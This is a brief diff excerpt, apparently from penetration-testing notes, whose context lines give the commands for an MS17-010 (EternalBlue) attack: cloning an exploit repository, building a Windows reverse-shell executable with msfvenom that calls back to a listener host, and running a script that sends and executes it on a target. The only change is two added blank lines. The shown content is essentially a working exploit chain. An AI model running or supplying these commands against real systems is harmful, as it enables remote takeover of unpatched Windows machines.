@@ -18,3 +18,5 @@ git clone https://github.com/helviojunior/MS17-010
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 ```
+
+
